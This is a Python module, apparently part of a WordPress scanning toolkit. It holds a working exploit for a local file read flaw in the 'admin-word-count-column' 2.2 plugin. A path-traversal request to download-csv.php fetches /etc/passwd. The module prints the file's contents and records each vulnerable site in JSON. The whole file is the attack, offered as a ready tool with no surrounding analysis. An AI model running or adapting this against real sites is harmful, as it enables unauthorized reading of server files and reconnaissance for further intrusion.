import sys
import os
try:
    # The insertion index should be 1 because index 0 is this file
    sys.path.insert(1, '{}/help'.format(os.getcwd()))  # the type of path is string
    # because the system path already have the absolute path to folder a
    # so it can recognize file_a.py while searching 
    from help.banner import colors
    from help.json_me import json_me
    from help.req import request
    
except (ModuleNotFoundError, ImportError) as e:
    print("{} fileure".format(type(e)))
else:
    print("Import succeeded")



def exploit(url):
    found = []
    req = request(url)
    if not (url.startswith('https://') or url.startswith('http://')):
        url = 'http://' + url
    try:
        x =  "{}/wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd"
        r = req.get(x.format(url))
        if r.status_code == 200 and "root" in r.text:
            print(r.text)
            print(colors.yellow + "[+] ==> Admin Word Count Column %s Vulnerable" % url)
            found.append({
                "url": url,
                "payload": x.format(url),
                "status": r.status_code,
                "exploit": "WordPress Plugin admin-word-count-column 2.2 - Local File Read",
            })
            json_me(url, "admin-word-count-column", found)
        else:

            print(colors.red + "[-] Admin Word Count Column ==> %s Not Vulnerable" % url )


    except Exception as e:
        print(e)
        pass


